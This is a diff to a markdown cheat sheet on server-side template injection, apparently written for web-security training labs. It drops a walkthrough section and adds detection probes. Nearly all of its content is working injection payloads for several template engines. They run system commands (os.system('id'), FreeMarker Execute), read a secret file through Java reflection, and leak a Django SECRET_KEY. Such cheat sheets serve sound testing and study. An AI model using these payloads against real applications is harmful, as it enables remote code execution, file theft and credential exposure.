@@ -1,4 +1,4 @@
-# Server Side Template Injection - CHEATSHEET + LABS
+# Server Side Template Injection - CHEATSHEET 
 
 ## Key Terms
 
@@ -6,30 +6,36 @@
 
 ```
 
-## Walkthrough - Most Important Labs
-
-- [1]()
-
-
 ## Cheat Sheet
 
 ```bash
 }{{}              
 ${{<%[%'"}}%
 ${{<%[%'"}}%\,
+{{foobar}}
+<%= foobar %> 
+${7/0} 
+{{7/0}}
+<%= 7/0 %>
+@{} 
 
 
 ${{7*7}}
-#{7*7}
 ${foobar}
+#{7*7}
+@(2+2)
 {{7*7}}
 }}{%25import+os%25}{{os.system('id')
 <%= 7 * 7 %>
 <%= system('cat /home/carlos/secret') %>
 }} {{7*7}}
-}} {{7*7
-{% debug %}       
+}} {{7*7       
 ${"freemarker.template.utility.Execute"?new()("cat /home/carlos/secret")}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/secret').toURL().openStream().readAllBytes()?join(" ")} 
+
+{% debug %}  
+{{settings.SECRET_KEY}}
+
 ```
 
 > SSTI MAP
